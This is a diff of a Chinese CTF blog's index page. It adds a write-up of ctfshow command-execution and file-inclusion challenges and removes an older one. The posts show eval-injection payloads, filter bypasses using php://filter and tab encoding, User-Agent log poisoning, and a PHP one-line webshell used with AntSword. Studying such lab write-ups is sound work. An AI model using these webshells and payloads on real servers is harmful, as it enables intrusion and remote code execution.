@@ -71,6 +71,48 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-2026-08-14-ctfshow 命令执行web58" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/14/2026-08-14-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb58/" class="article-date">
+  <time class="dt-published" datetime="2026-08-14T00:00:00.000Z" itemprop="datePublished">2026-08-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/14/2026-08-14-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb58/">ctfshow 命令执行web58</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>题目来源：ctfshow 命令执行web58<br>题目链接(<a target="_blank" rel="noopener" href="https://f4abf6ff-1b15-4190-83ce-3f76a3c8c924.challenge.ctf.show/">https://f4abf6ff-1b15-4190-83ce-3f76a3c8c924.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260814104232.png"><br>检查用户是否通过POST方式提交了名为<code>c</code>的参数，如果提交了，就直接用<code>eval()</code>函数将参数值当作PHP代码执行</p>
+<p>POST传参<br><code>c=system(&quot;cat flag.php&quot;);</code><br><img src="/images/Pastedimage20260814105023.png"><br>发现系统命令system()被禁用<br>改用PHP函数 <code>highlight_file()</code> 是PHP的内置函数，用于将文件的源代码进行语法高亮显示，并以HTML格式输出到浏览器<br><code>c=highlight_file(&quot;flag.php&quot;);</code><br><img src="/images/Pastedimage20260814104747.png"><br>得到flag</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web66<br>题目链接(<a target="_blank" rel="noopener" href="https://f570a231-3b4c-428d-957b-fcff1ec0f750.challenge.ctf.show/">https://f570a231-3b4c-428d-957b-fcff1ec0f750.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260814110508.png"><br>检查用户是否通过POST方式提交了名为<code>c</code>的参数，如果提交了，就直接用<code>eval()</code>函数将参数值当作PHP代码执行<br><img src="/images/Pastedimage20260814110624.png"><br>发现flag不在flag.php<br>换个思路 蚁剑连接 &#x2F;index.php 密码为c<br><img src="/images/Pastedimage20260814111347.png"><br>发现flag.php文件 但是里面是空的<br><img src="/images/Pastedimage20260814111421.png"><br>在根目录下查找<br><img src="/images/Pastedimage20260814111456.png"><br>发现flag.txt文件<br>POST传参读取该文件试试 <code>c=highlight_file(&quot;/flag.txt&quot;);</code><br><img src="/images/Pastedimage20260814113008.png"><br>得到flag</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 文件包含81<br>题目链接(<a target="_blank" rel="noopener" href="https://02f5939d-c107-486b-808e-08e4e7dda217.challenge.ctf.show/">https://02f5939d-c107-486b-808e-08e4e7dda217.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260814120053.png"><br>将 <code>&quot;php&quot;</code> 替换为 <code>&quot;???&quot;</code>  将 <code>&quot;data&quot;</code> 替换为 <code>&quot;???&quot;</code> 将<code>:</code>替换为<code>???</code><br>所以<code>data://</code>协议和<code>php://filter</code>协议都不可用 还是考虑日志注入<br>但是这道题换一种做法 直接连接蚁剑<br>同样在UA中写入一句话木马<br><img src="/images/Pastedimage20260814114904.png"><br>这些代码以文本形式保存在日志文件中 代码实现了从POST请求中获取名为<code>cmd</code>的参数值<br>并且如果日志文件中包含PHP代码，当被<code>include()</code>包含时，PHP引擎会执行它<br>所以蚁剑直接连接日志文件<br><img src="/images/Pastedimage20260814115423.png"><br>发现fl0g.php文件<br><img src="/images/Pastedimage20260814115359.png"><br>拿到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/14/2026-08-14-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb58/" data-id="cmsswp6w60000z8uy6217f14w" data-title="ctfshow 命令执行web58" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-2026-08-13-ctfshow 命令执行web54" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/08/13/2026-08-13-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb54/" class="article-date">
@@ -509,50 +551,6 @@
 
 
   
-    <article id="post-2026-07-26-Untitled" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/07/26/2026-07-26-Untitled/" class="article-date">
-  <time class="dt-published" datetime="2026-07-26T00:00:00.000Z" itemprop="datePublished">2026-07-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/07/26/2026-07-26-Untitled/">Untitled</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><img src="/images/Pastedimage20260726104237.png"><br>要求GET传参传入参数c 正则匹配过滤了flag system php cat sort shell 点号、空格、单引号、双引号、反引号、分号和左括号<br>构造payload:<code>/?c=include%09&quot;/fla*&quot;?&gt;</code><br>因为左括号被禁用 所以尝试文件包含 避开括号 语法include 文件名;<br>因为空格被禁用 所以用tab键的url编码 %09<br>因为分号被禁用 所以用 <code>?&gt;</code>来结束当前的PHP语句<br><img src="/images/Pastedimage20260726102936.png"><br>但是行不通 问题出在通配符 include是PHP的语言结构 不是Shell命令 即PHP的文件操作函数不支持通配符 它们只接受具体的文件路径</p>
-<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>使用文件包含的同时加上php伪协议<br><code>/?c=include%09$_GET[0]?&gt;&amp;0=php://filter/convert.base64-encode/resource=flag.php</code><br><code>$_GET</code> 是一个数组，内容是URL 中所有GET参数组成的键值对<br><code>[0]</code> 表示键名为 <code>0</code> 的数组元素<br><strong>注意:<code>$_GET</code>是关联数组  所以<code>[0]</code>只是键名为<code>0</code>的元素，与位置无关，区别于索引数组</strong><br>并且数字键名不需要引号 整体实现了获取URL中参数 <code>0</code> 的值 避免使用引号<br><code>?&gt;</code>PHP结束标签<br><code>&amp;</code> 分隔多个GET参数 即<code>c</code>和<code>0</code><br><code>0=</code> 定义参数名为 <code>0</code> 对应PHP中的 <code>$_GET[0]</code></p>
-<p><code>php://filter/convert.base64-encode/resource=</code>这是PHP伪协议 读取文件内容并以Base64编码输出<br>拆解:<br><code>php://</code>PHP 内置的伪协议<br><code>filter</code>表示使用过滤器功能<br><code>/convert.base64-encode</code>过滤器名称 作用：把文件内容转换为 Base64 编码<br><code>/resource=</code>指定要处理的文件路径</p>
-<p>整体执行逻辑：<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;]</code> &#x3D; <code>&#39;include%09$_GET[0]?&gt;&#39;</code><br>    <code>$_GET[0]</code> &#x3D; <code>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 flag.php   <code>include &#39;flag.php&#39;;  4.执行</code>include ‘flag.php’;&#96;<br><img src="/images/Pastedimage20260726111411.png">解码得到flag<br><img src="/images/Pastedimage20260726104818.png"><br>这是已知flag位置的前提下 可以使用这个方法</p>
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果在不知道flag的位置的前提下 需要使用文件包含+日志注入的方式<br>判断是否能日志注入：尝试包含日志文件看是否能读取内容<br>首先抓包看看 得到服务器为nginx<br><img src="/images/Pastedimage20260726173239.png"><br><code>/var/log/nginx/access.log</code>是<code>nginx</code>默认的access日志路径<br>所以和上一个payload的大体格式一样构造，只是将静态的读取文件变成了动态的包含日志，执行其中的PHP代码<br><code>/?c=include%09$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</code><br><img src="/images/Pastedimage20260726173937.png"><br>这个payload的执行过程如下：<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;] = &#39;include%09$_GET[0]?&gt;&#39;;     </code>$_GET[0] &#x3D; ‘&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log’;<br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log   <code>include &#39;/var/log/nginx/access.log&#39;;</code><br>4.执行<code>include &#39;/var/log/nginx/access.log&#39;;</code><br>整个过程纯文本输出，没有任何PHP代码被执行<br>返回包里面包含了所有的攻击尝试记录 说明<code>include</code> 成功执行 日志文件被包含</p>
-<p>下一步修改UA把一句话木马存进服务器的日志文件里，然后通过包含日志文件来执行代码<br>一句话木马<code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code><br>写一句话木马的作用:<br>凡是从POST参数里传入 <code>cmd</code> ，都把它当成PHP代码执行，然后把结果返回<br>选择修改UA的原因：<br>1.Nginx默认记录每个请求的UA到访问日志<br>2.UA内容完全可控<br>3.UA内容不会被过滤<br><img src="/images/Pastedimage20260726173916.png"><br>写入后用蚁剑连接(蚁剑自动化、图形化、批量化地完成POST传参过程)<br>注意：HTTPS可能有证书验证问题或端口限制 所以一开始用https连接失败 改成http才可以<br><img src="/images/Pastedimage20260726173903.png"><br>得到flag<br><img src="/images/Pastedimage20260726172437.png"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://l-y-f-f1111.github.io/2026/07/26/2026-07-26-Untitled/" data-id="cmsrc1va60002msuyg61aa4d4" data-title="Untitled" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -589,6 +587,10 @@
       <ul>
         
           <li>
+            <a href="/2026/08/14/2026-08-14-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb58/">ctfshow 命令执行web58</a>
+          </li>
+        
+          <li>
             <a href="/2026/08/13/2026-08-13-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb54/">ctfshow 命令执行web54</a>
           </li>
         
@@ -602,10 +604,6 @@
         
           <li>
             <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/">ctfshow 命令执行web50</a>
-          </li>
-        
-          <li>
-            <a href="/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/">ctfshow 命令执行web47</a>
           </li>
         
       </ul>
